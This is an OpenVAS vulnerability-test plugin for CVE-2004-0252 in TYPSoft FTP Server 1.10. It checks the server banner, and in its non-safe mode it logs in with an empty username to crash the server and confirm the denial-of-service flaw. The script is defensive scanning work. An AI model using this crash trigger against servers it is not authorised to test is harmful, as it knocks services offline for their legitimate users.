# OpenVAS Vulnerability Test
# $Id: typsoftftp_empty_username_dos.nasl 13613 2019-02-12 16:12:57Z cfischer $
# Description: TYPSoft empty username DoS
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2004 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

# Ref: "intuit bug_hunter" <intuit@linuxmail.org>

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14707");
  script_version("$Revision: 13613 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-12 17:12:57 +0100 (Tue, 12 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2004-0252");
  script_bugtraq_id(9573);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("TYPSoft empty username DoS");
  script_category(ACT_MIXED_ATTACK);
  script_tag(name:"qod_type", value:"remote_banner");
  script_copyright("This script is Copyright (C) 2004 David Maciejak");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/typsoft/detected");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"solution", value:"Use a different FTP server or upgrade to the newest version.");

  script_tag(name:"summary", value:"The remote host seems to be running TYPSoft FTP server, version 1.10.

  This version is prone to a remote denial of service flaw.");

  script_tag(name:"impact", value:"By sending an empty login username, an attacker can cause the ftp server
  to crash, denying service to legitimate users.");

  exit(0);
}

include("ftp_func.inc");

kb_creds = ftp_get_kb_creds();
login = ""; # nb: Empty pass is expected, see impact.
pass = kb_creds["pass"];

port = get_ftp_port(default:21);
banner = get_ftp_banner(port:port);
if( ! banner || "TYPSoft FTP Server" >!< banner )
  exit(0);

if(safe_checks())
{
  if(egrep(pattern:".*TYPSoft FTP Server (1\.10[^0-9])", string:banner) )
    security_message(port);
  exit(0);
}
else
{
  soc = open_sock_tcp(port);
  if ( ! soc ) exit(0);

  if(ftp_authenticate(socket:soc, user:login, pass:pass))
  {
    sleep(1);
    #ftp_close(socket: soc);
    soc2 = open_sock_tcp(port);
    if ( ! soc2 || ! recv_line(socket:soc2, length:4096))
      security_message(port);
    else
      close(soc2);
    close(soc);
  }
}

exit(0);